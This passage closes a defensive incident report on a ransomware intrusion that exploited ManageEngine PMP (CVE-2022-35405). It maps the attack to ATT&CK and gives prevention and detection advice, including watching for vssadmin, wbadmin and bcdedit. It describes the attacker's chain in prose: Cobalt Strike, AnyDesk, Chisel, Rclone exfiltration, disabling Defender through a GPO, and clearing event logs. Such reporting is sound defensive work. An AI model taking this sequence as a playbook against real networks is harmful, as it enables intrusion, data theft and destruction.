Source: ATT&CK mitigation M1040 in the context of technique T1486

Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.

On Windows 10, enable cloud-delivered protection and Attack Surface Reduction (ASR) rules to block the execution of files that resemble ransomware. (Microsoft: Use attack surface reduction rules to prevent malware infection, 2021-07-02)

#### Detection

**Monitor File Creation**  
Source: ATT&CK data component File Creation in the context of technique T1486

Monitor for newly constructed files in user directories.

**Monitor Network Share Access**  
Source: ATT&CK data component Network Share Access in the context of technique T1486

Monitor for unexpected network shares being accessed on target systems or on large numbers of systems.

**Monitor Command Execution**  
Source: ATT&CK data component Command Execution in the context of technique T1486

Monitor executed commands and arguments for actions involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit

**Monitor Process Creation**  
Source: ATT&CK data component Process Creation in the context of technique T1486

Monitor for newly constructed processes and/or command-lines involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit.

### 2.13. Deletion of Windows Event Logs

| **Timestamp** | Day 124, 22:35 |
|---|---|
| **Techniques** | T1070.001 Clear Windows Event Logs to achieve TA0005 Defense Evasion |
| **Tools** | Unknown |
| **Target tech** | Windows Server |

Shortly after executing the ransomware the adversary cleared multiple log sources on one single server. These log sources were: the Security Event Logs, System Event Logs and the Application Event Logs. Deleting logfiles is often done by attackers as this prevents responders from gaining insights into attacker activities.

#### Prevention

**Restrict File and Directory Permissions**  
Source: ATT&CK mitigation M1022 in the context of technique T1070.001

Restrict access by setting directory and file permissions that are not specific to users or privileged accounts.

Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities.

#### Detection

**Monitor File Deletion**  
Source: ATT&CK data component File Deletion in the context of technique T1070.001

Monitor for unexpected deletion of Windows event logs (via native binaries) and may also generate an alterable event (Event ID 1102: "The audit log was cleared")

---

## 3. MITRE ATT&CK TTPs

This chapter lists the MITRE ATT&CK Tactics, Techniques, and Procedures (TTPs) of the attack described in this report. The TTPs are listed in the order they were observed in the attack. They are formatted in a table to facilitate ingestion of this data into other tools, such as Threat Intelligence Platforms (TIPs).

Note that each tactic-technique-procedure combination is listed here, which can lead to apparent duplication. For example, if a procedure is linked to more than one technique, it will be listed repeatedly for each technique.

| **Tactic** | **Technique** | **Procedure** |
|---|---|---|
| TA0001 Initial Access | T1190 Exploit Public-Facing Application | ManageEngine Password Manager Pro (PMP) allows for the secure storage of passwords and other sensitive information. A major vulnerability, also referred to as CVE-2022-35405, was discovered in PMP and allowed for arbitrary code execution without the need of any authentication. |
| TA0004 Privilege Escalation | T1068 Exploitation for Privilege Escalation | By exploiting the PMP service, the adversary gained access to the NT Authority\SYSTEM (hereinafter: SYSTEM) account as the service was running under that account. SYSTEM is the Windows account with the highest local privileges and it is not unusual for a service on Windows to be running under this account. In this particular case it meant that the attacker had access to the account with the highest local privileges from the time of exploitation. |
| TA0003 Persistence | T1133 External Remote Services | Hours after initial access, the adversary engaged in setting up multiple local Microsoft Remote Desktop (hereinafter: RDP) sessions to the compromised server with the local Guest account. |
| TA0007 Discovery | T1046 Network Service Discovery | During one of the RDP sessions mentioned earlier, the adversary used Advanced IP Scanner. This is a well-known tool used by administrators that allows for the collection of network information. However, the scanner is often abused by attackers to gather intel about which servers are available in a victim's network and to set out an attack path. |
| TA0007 Discovery | T1087.002 Domain Account | After the network scan the adversary did not conduct any further activities until four days later. An RDP session was again set up to the victim's network. During this session the adversary used another reconnaissance tool, namely ADFind. ADFind allows a user to enumerate the Active Directory that, for instance, contains information about the users and groups in a Windows domain. |
| TA0006 Credential Access | T1552.001 Credentials In Files | After the last reconnaissance action the adversary didn't reconnect to the victim's network until five weeks later. Windows Event Logs contained traces of a different user that was utilised to remotely connect to the PMP server, namely a domain administrator account. |
| TA0003 Persistence | | Logged in as the domain administrator the adversary installed several Cobalt Strike Beacons (hereinafter: Beacons) on multiple systems. |
| TA0008 Lateral Movement | | Logged in as the domain administrator the adversary installed several Cobalt Strike Beacons (hereinafter: Beacons) on multiple systems. |
| TA0011 Command and Control | | Logged in as the domain administrator the adversary installed several Cobalt Strike Beacons (hereinafter: Beacons) on multiple systems. |
| TA0003 Persistence | T1133 External Remote Services | A week later the adversary returned and installed the remote access tool AnyDesk. |
| TA0003 Persistence | T1053.005 Scheduled Task | After another break in activity, the adversary returned to the network and attempted to install another backdoor: Chisel. However, this backdoor was detected and stopped by Windows Defender. |
| TA0010 Exfiltration | T1567.002 Exfiltration to Cloud Storage | The adversary used the application Rclone to exfiltrate a large amount of data from the file server located in the victim's environment to the attacker's infrastructure. Rclone is a legitimate application used to upload data to for instance a cloud instance. Like many of the applications mentioned earlier in this report, it is also often abused by adversaries. |
| TA0005 Defense Evasion | T1562.001 Disable or Modify Tools | In preparation for the ransomware roll-out, the adversary modified an existing Group Policy Object to disable Windows Defender and the Windows firewall, and to configure systems to accept incoming RDP session requests. The adversary did so by adding a scheduled task with the name Google Update and by adding administrative templates to the GPO. |
| TA0040 Impact | T1486 Data Encrypted for Impact | To stage the ransomware, the adversary created several malicious files on the infected systems. These concerned batchfiles named gp.bat and k.bat. These .bat files were created in the folder C:\Windows. Fox-IT was unable to verify the content of the .bat files as the adversary deleted these from the systems and thus were not part of the investigation material. |
| TA0005 Defense Evasion | T1070.001 Clear Windows Event Logs | Shortly after executing the ransomware the adversary cleared multiple log sources on one single server. These log sources were: the Security Event Logs, System Event Logs and the Application Event Logs. Deleting logfiles is often done by attackers as this prevents responders from gaining insights into attacker activities. |

---

*Express Attack Brief 018 - Prepared for Fox-IT*  
*Page 22 of 22*